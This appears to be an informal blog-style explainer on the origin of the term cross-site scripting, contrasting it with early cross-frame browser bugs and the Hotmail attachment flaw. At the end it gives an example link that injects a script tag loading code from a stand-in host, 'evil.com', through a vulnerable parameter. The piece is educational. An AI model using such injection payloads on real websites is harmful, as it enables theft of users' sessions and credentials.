## The Origin of Cross-Site Scripting (XSS) - Hacker Etymology

Cross- Site scripting (named by David Ross of Microsoft) is security issue that affects websites. Why shouldn’t it be called Javascript code injection, or HTML injection?

*“Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application.”*

National Computer emergency response team along with Microsoft coordinated for it.


Cross Frame policy security issue: issue related to crossing over into another browser frame.

Back then (2000), vulnerabilities were breaking browser security boundary between two websites. One website (attacker) that either embeds another site (victim) via iframes or opens another site via window.open, somehow exploiting bug in the browser, can access data from other website, like cookies or so. 

*“An HTML iframe is used to display a web page within a web page."<br>`<iframe src="url" title="description"></iframe>`*

*“(Java) The open() method opens a new browser window, or a new tab, depending on your browser settings and the parameter values.*<br>`window.open("https://www.w3schools.com");`
<br>*"I guess this is how all the pop up ads that send you to new tab work”*


Whereas, XSS is vulnerability in websites themselves.

Hotmail ATTACKMENTS: “Users clicking on mail attachments in Hotmail are vulnerable to having their passwords stolen by malicious users.” They had a chart where they compared which freemail services were safe from injection of script tags, meta tags and java applets. 

XSS is a vulnerability where you can inject javascript code into a website that another user then executes, so it needs user to communicate, so first xss attackers were webmailers.

For example <br> `<a href “http:foo.com/form.asp?id=<script src=’http://evil.com/evilscript.js’></script>” http://microsoft.com</a>`<br>Here it shown website is actually pointing towards some other website with vulnerable parameter ID.
